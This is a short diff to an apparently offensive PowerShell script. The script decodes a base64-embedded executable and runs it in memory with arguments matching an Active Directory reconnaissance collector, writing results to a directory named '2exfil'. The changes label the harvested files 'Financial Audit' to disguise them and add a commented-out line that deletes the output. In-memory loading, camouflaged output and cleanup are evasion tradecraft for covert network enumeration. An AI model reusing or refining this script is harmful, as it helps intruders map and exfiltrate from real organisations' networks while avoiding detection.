@@ -12,7 +12,7 @@ $binaryContent = [System.Convert]::FromBase64String($base64Content)
 $outputDirectory = "C:\temp\2exfil"    # Outputting to specific directoy
 
 # Define the arguments required by the executable
-$arguments = "-c All --outputdirectory $outputDirectory"
+$arguments = "-c All --outputdirectory $outputDirectory --OutputPrefix ""Financial Audit"""
 
 # Create a new memory stream and write the binary content to it
 $memoryStream = New-Object System.IO.MemoryStream
@@ -36,3 +36,6 @@ if ($entryPoint.GetParameters().Length -gt 0) {
 # Clean up
 $memoryStream.Close()
 $memoryStream.Dispose()
+
+# Clean output files
+#Remove-Item -Path "C:\temp\2exfil\Financial Audit*"
